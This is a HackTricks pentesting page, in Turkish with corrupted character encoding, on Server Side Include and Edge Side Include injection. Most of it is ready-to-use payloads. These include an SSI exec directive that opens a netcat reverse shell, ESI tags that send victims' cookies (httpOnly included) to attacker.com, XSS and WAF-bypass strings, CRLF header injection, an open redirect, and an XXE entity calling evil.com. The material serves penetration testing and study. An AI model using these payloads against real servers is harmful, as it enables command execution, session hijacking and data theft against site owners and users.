# Server Side Inclusion/Edge Side Inclusion Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Server Side Inclusion Temel Bilgiler

**(GiriÅŸ [Apache belgelerinden](https://httpd.apache.org/docs/current/howto/ssi.html) alÄ±nmÄ±ÅŸtÄ±r)**

SSI (Server Side Includes), **HTML sayfalarÄ±na yerleÅŸtirilen ve sayfalar sunulurken sunucuda deÄŸerlendirilen** direktiflerdir. Mevcut bir HTML sayfasÄ±na **dinamik olarak Ã¼retilen iÃ§erik** eklemenizi saÄŸlar, tÃ¼m sayfayÄ± bir CGI programÄ± veya diÄŸer dinamik teknoloji aracÄ±lÄ±ÄŸÄ±yla sunmak zorunda kalmadan.\
Ã–rneÄŸin, mevcut bir HTML sayfasÄ±na ÅŸu ÅŸekilde bir direktif yerleÅŸtirebilirsiniz:

`<!--#echo var="DATE_LOCAL" -->`

Ve sayfa sunulduÄŸunda, bu parÃ§a deÄŸerlendirilecek ve deÄŸeri ile deÄŸiÅŸtirilecektir:

`SalÄ±, 15-Oca-2013 19:28:54 EST`

SSI kullanma kararÄ±, sayfanÄ±zÄ±n ne kadarÄ±nÄ±n statik olduÄŸu ve sayfa her sunulduÄŸunda ne kadarÄ±nÄ±n yeniden hesaplanmasÄ± gerektiÄŸi ile genellikle ilgilidir. SSI, yukarÄ±da gÃ¶sterilen mevcut zamanÄ± gibi kÃ¼Ã§Ã¼k bilgi parÃ§alarÄ± eklemek iÃ§in harika bir yoldur. Ancak sayfanÄ±zÄ±n Ã§oÄŸunluÄŸu sunulduÄŸu anda Ã¼retiliyorsa, baÅŸka bir Ã§Ã¶zÃ¼m aramanÄ±z gerekir.

Web uygulamasÄ± **`.shtml`, `.shtm` veya `.stm`** uzantÄ±lÄ± dosyalar kullanÄ±yorsa SSI'nin varlÄ±ÄŸÄ±nÄ± Ã§Ä±karabilirsiniz, ancak bu sadece bir durum deÄŸildir.

Tipik bir SSI ifadesinin aÅŸaÄŸÄ±daki formatÄ± vardÄ±r:
```
<!--#directive param="value" -->
```
### Kontrol
```javascript
// Document name
<!--#echo var="DOCUMENT_NAME" -->
// Date
<!--#echo var="DATE_LOCAL" -->

// File inclusion
<!--#include virtual="/index.html" -->
// Including files (same directory)
<!--#include file="file_to_include.html" -->
// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->
// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->
// Modification date of a file
<!--#flastmod file="index.html" -->

// Command exec
<!--#exec cmd="dir" -->
// Command exec
<!--#exec cmd="ls" -->
// Reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

// Print all variables
<!--#printenv -->
// Setting variables
<!--#set var="name" value="Rich" -->

```
## Edge Side Inclusion

**Dinamik uygulamalarÄ±n veya bilgilerin Ã¶nbelleÄŸe alÄ±nmasÄ±** ile ilgili bir sorun vardÄ±r, Ã§Ã¼nkÃ¼ iÃ§eriÄŸin bir sonraki kez alÄ±ndÄ±ÄŸÄ±nda **deÄŸiÅŸmiÅŸ** olabileceÄŸi durumlar vardÄ±r. Bu, **ESI**'nin kullanÄ±lma amacÄ±dÄ±r; ESI etiketlerini kullanarak **Ã¶nbellek versiyonundan Ã¶nce oluÅŸturulmasÄ± gereken dinamik iÃ§eriÄŸi** belirtmek iÃ§in.\
EÄŸer bir **saldÄ±rgan** Ã¶nbellek iÃ§eriÄŸine **bir ESI etiketi enjekte edebilirse**, o zaman, kullanÄ±cÄ±lar iÃ§in gÃ¶nderilmeden Ã¶nce belgede **rastgele iÃ§erik enjekte edebilir**.

### ESI Detection

Sunucudan gelen bir yanÄ±ttaki aÅŸaÄŸÄ±daki **header**, sunucunun ESI kullandÄ±ÄŸÄ±nÄ± gÃ¶sterir:
```
Surrogate-Control: content="ESI/1.0"
```
EÄŸer bu baÅŸlÄ±ÄŸÄ± bulamazsanÄ±z, sunucu **her neyse ESI kullanÄ±yor olabilir**.\
**KÃ¶r istismar yaklaÅŸÄ±mÄ± da kullanÄ±labilir** Ã§Ã¼nkÃ¼ bir isteÄŸin saldÄ±rganÄ±n sunucusuna ulaÅŸmasÄ± gerekir:
```javascript
// Basic detection
hell<!--esi-->o
// If previous is reflected as "hello", it's vulnerable

// Blind detection
<esi:include src=http://attacker.com>

// XSS Exploitation Example
<esi:include src=http://attacker.com/XSSPAYLOAD.html>

// Cookie Stealer (bypass httpOnly flag)
<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```
### ESI istismarÄ±

[GoSecure oluÅŸturdu](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) farklÄ± ESI uyumlu yazÄ±lÄ±mlar Ã¼zerinde deneyebileceÄŸimiz olasÄ± saldÄ±rÄ±larÄ± anlamak iÃ§in bir tablo:

* **Includes**: `<esi:includes>` direktifini destekler
* **Vars**: `<esi:vars>` direktifini destekler. XSS Filtrelerini atlatmak iÃ§in kullanÄ±ÅŸlÄ±dÄ±r
* **Cookie**: Belge Ã§erezleri ESI motoruna eriÅŸilebilir
* **Upstream Headers Required**: Surrogate uygulamalarÄ±, upstream uygulama baÅŸlÄ±klarÄ± saÄŸlamadÄ±kÃ§a ESI ifadelerini iÅŸleme almaz
* **Host Allowlist**: Bu durumda, ESI dahil etmeleri yalnÄ±zca izin verilen sunucu ana bilgisayarlarÄ±ndan mÃ¼mkÃ¼ndÃ¼r, bu da Ã¶rneÄŸin SSRF'yi yalnÄ±zca bu ana bilgisayarlara karÅŸÄ± mÃ¼mkÃ¼n kÄ±lar

|         **YazÄ±lÄ±m**         | **Includes** | **Vars** | **Cookies** | **Upstream Headers Required** | **Host Whitelist** |
| :--------------------------: | :----------: | :------: | :---------: | :---------------------------: | :----------------: |
|            Squid3            |      Evet    |    Evet  |     Evet    |              Evet             |         HayÄ±r      |
|         Varnish Cache        |      Evet    |    HayÄ±r |     HayÄ±r   |              Evet             |         Evet       |
|            Fastly            |      Evet    |    HayÄ±r |     HayÄ±r   |              HayÄ±r            |         Evet       |
| Akamai ESI Test Sunucusu (ETS) |      Evet    |    Evet  |     Evet    |              HayÄ±r            |         HayÄ±r      |
|          NodeJS esi          |      Evet    |    Evet  |     Evet    |              HayÄ±r            |         HayÄ±r      |
|         NodeJS nodesi        |      Evet    |    HayÄ±r |     HayÄ±r   |              HayÄ±r            |      Opsiyonel     |

#### XSS

AÅŸaÄŸÄ±daki ESI direktifi, sunucunun yanÄ±tÄ± iÃ§inde rastgele bir dosya yÃ¼kleyecektir.
```xml
<esi:include src=http://attacker.com/xss.html>
```
#### Ä°stemci XSS korumasÄ±nÄ± atlatma
```xml
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>

Use <!--esi--> to bypass WAFs:
<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
```
#### Ã‡erez Ã‡alma

* Uzaktan Ã§erez Ã§alma
```xml
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
```
* HTTP\_ONLY Ã§erezini XSS ile yanÄ±t iÃ§inde yansÄ±tarak Ã§alÄ±n:
```bash
# This will reflect the cookies in the response
<!--esi $(HTTP_COOKIE) -->
# Reflect XSS (you can put '"><svg/onload=prompt(1)>' URL encoded and the URL encode eveyrhitng to send it in the HTTP request)
<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->

# It's possible to put more complex JS code to steal cookies or perform actions
```
#### Ã–zel Yerel Dosya

Bunu "Yerel Dosya Dahil Etme" ile karÄ±ÅŸtÄ±rmayÄ±n:
```markup
<esi:include src="secret.txt">
```
#### CRLF
```markup
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
```
#### Open Redirect

AÅŸaÄŸÄ±daki, yanÄ±ta bir `Location` baÅŸlÄ±ÄŸÄ± ekleyecektir.
```bash
<!--esi $add_header('Location','http://attacker.com') -->
```
#### BaÅŸlÄ±k Ekle

* Zorunlu istekte baÅŸlÄ±k ekle
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345"/>
</esi:include>
```
* YanÄ±tÄ±n baÅŸlÄ±ÄŸÄ±na ekleyin (XSS iÃ§eren bir yanÄ±tta "Content-Type: text/json" atlatmak iÃ§in faydalÄ±dÄ±r)
```bash
<!--esi/$add_header('Content-Type','text/html')/-->

<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->

# Check the number of url_decode to know how many times you can URL encode the value
```
#### CRLF Ekle baÅŸlÄ±ÄŸÄ±nda (**CVE-2019-2438**)
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345
Host: anotherhost.com"/>
</esi:include>
```
#### Akamai debug

Bu, yanÄ±tta yer alan hata ayÄ±klama bilgilerini gÃ¶nderecektir:
```xml
<esi:debug/>
```
### ESI + XSLT = XXE

_dca_ parametresi iÃ§in `xslt` deÄŸerini belirleyerek, **`eXtensible Stylesheet Language Transformations (XSLT)`** tabanlÄ± ESI'yi dahil etmek mÃ¼mkÃ¼ndÃ¼r. Dahil etme, HTTP surrogate'Ä±nÄ±n XML ve XSLT dosyalarÄ±nÄ± almasÄ±na neden olur; bu da birincisini filtreler. Bu tÃ¼r XML dosyalarÄ±, saldÄ±rganlarÄ±n SSRF saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirmesine olanak tanÄ±yan _XML External Entity (XXE)_ saldÄ±rÄ±larÄ± iÃ§in kullanÄ±labilir. Ancak, bu yaklaÅŸÄ±mÄ±n faydasÄ± sÄ±nÄ±rlÄ±dÄ±r Ã§Ã¼nkÃ¼ ESI zaten bir SSRF vektÃ¶rÃ¼ olarak hizmet eder. Temel Xalan kÃ¼tÃ¼phanesinde destek olmamasÄ± nedeniyle, harici DTD'ler iÅŸlenmez ve yerel dosya Ã§Ä±karÄ±mÄ± engellenir.
```xml
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```
XSLT dosyasÄ±:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
<foo>&xxe;</foo>
```
Check the XSLT page:

{% content-ref url="xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

### Referanslar

* [https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
* [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
* [https://academy.hackthebox.com/module/145/section/1304](https://academy.hackthebox.com/module/145/section/1304)
* [https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91](https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91)

## Brute-Force Tespit Listesi

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt" %}

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
